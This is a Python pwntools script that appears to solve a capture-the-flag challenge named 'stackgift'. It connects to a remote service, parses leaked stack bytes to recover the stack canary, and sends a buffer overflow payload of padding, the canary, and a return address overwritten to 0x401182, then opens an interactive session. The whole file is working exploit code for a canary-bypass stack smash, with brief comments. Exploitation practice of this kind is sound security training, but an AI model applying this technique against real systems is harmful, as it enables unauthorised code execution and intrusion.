from pwn import *

r = remote('109.233.56.90',11607)
#r = process('./stackgift')
win = r.recvuntil('Now')

k = 0
temp = ''
li = list()
win = win[:-4]
for i in win:
    temp = temp + str(i) + ' '
    k = k+1
    print(hex(i),end=' ')
    if k == 8:
        print('\n')
        k = 0
        li.append(temp)
        temp = ''
#output bytes in a group of 8 and list them

print(li)
print('')
for i in range(0,len(li)):
    if((li[i][0]=='0')):
        print(li[i][-2:])
        if li[i][2] == '0':
            print('')
        else:
            print(li[i])
            kek = li[i]
#sorting the received list elements by first zero, and if element 3 ('| 0 || || 0 |') is equal to 0, then do not remember it

print('kal')
print(kek)
lis = list()
kek = kek[:-1]
x = [int(i) for i in kek.split(' ')]

#convert string to list of int to manipulate the resulting values

print(x)
kuk = b''
for i in x:
    kuk = kuk + p8(i)

#converting list of int to byte string with stack canary value

payload = b'A'*40+kuk+b'A'*8+p64(0x401182)
#40 bytes of trash, kuk = stack canary, 8 bytes of rpb register and 8 bytes for return address, that we change.
r.send(payload)

r.recv()
r.interactive()
